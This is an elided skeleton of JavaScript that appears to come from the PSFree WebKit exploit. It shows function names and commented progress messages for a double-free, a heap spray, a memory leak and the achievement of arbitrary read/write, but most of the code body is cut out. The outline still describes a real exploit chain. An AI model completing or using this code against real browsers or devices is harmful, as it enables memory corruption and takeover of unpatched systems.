...
async function setup_ar(save) {
    ...
    // progress.innerHTML="setup_ar() gc done";
    ...
    while (true) {
        ...
        for (let i = 0; i < str_arr.length; i++) {
            if (str_arr[i].length > 0xff) {
                rstr = str_arr[i];
                found = true;
                // progress.innerHTML="confirmed correct leaked";
...
async function double_free(save) {
    ...
    // progress.innerHTML="spraying views";
    ...
    tmp = null;
    // progress.innerHTML="done spray views";
    ...
    // progress.innerHTML="start find leak";
    /*
       /!\
    ...
    // progress.innerHTML="end find leak";
    // progress.innerHTML="view addr ' + view_leak);
    ...
    // progress.innerHTML="contents of JSArrayBufferView";
    // showMessage(jsview);
}
...
async function setup_arw(save, ssv_data) {
    ...
    // progress.innerHTML="view contents:";
    ...
    for (const msg of msgs) {
        if (msg.data !== '') {
            // progress.innerHTML="[+] Webkit exploit (PSFree) (achieved arbitrary r/w)";

            const u = new Uint8Array(msg.data);
            // progress.innerHTML="deserialized ArrayBuffer:";
...
function pop(event, save) {
    ...
    if (spray_res === null) {
        ...
        // progress.innerHTML="ssv len: ' + ssv_len);
        // progress.innerHTML="view index: ' + spray_res);
        // showMessage(save.ab);
    }
}
...
async function get_ready() {
    // progress.innerHTML="readyState: ' + document.readyState);
...
async function run_psfree() {
    StartTimer();
    progress.innerHTML="[+] Webkit exploit (PSFree) (Step 0 - Readying)";
    await get_ready();
